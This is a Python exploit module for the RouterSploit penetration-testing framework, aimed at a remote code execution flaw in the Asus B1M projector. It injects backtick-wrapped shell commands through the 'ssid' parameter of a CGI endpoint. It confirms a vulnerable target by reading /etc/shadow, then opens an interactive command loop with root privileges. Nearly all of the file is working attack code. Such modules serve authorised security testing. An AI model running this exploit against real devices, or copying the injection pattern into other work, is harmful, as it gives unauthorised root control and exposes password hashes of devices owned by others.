from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    mute,
    validators,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Asus B1M Projector Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'Asus B1M Projector RCE',
        'description': 'Module exploits Asus B1M Projector Remote Code Execution vulnerability which '
                       'allows executing command on operating system level with root privileges.',
        'authors': [
            'Hacker House <www.myhackerhouse.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.myhackerhouse.com/asus-b1m-projector-remote-root-0day/',
        ],
        'devices': [
            'Asus B1M Projector',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port', validators=validators.integer)

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        """ callback used by shell functionality """
        url = "{}:{}/cgi-bin/apply.cgi?ssid=\"%20\"`{}`".format(self.target, self.port, cmd)

        response = http_request(method="GET", url=url)
        if response is None:
            return ""

        return response.text

    @mute
    def check(self):
        cmd = "cat /etc/shadow"
        response_text = self.execute(cmd)

        if "root:" in response_text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
